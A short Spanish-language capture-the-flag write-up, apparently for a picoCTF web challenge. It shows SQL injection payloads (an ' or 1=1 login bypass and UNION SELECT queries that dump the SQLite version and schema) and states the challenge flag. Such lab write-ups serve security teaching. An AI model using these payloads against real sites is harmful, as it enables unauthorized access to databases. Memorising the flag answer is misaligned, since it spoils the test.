## Descripción :
	Can you find the flag on this website.
	Additional details will be available after launching your challenge instance.

## Solución :
		Una vez en la pagina dada, intento entar al login con la inyeccion sql ' or 1=1;' y me da acceso, una vez dentro saco la version del sqlite con :' union select sqlite_version(),2,3;'
			y ahora con esta consulta obtuve la estructura de las tablas :Algiers' union select sql,2,3 from sqlite_master;
	
y ahora con esta ultima consulta consegui la flag que estaba en la posicion 3 de la tabla more_tables:

	Flag : 
	picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}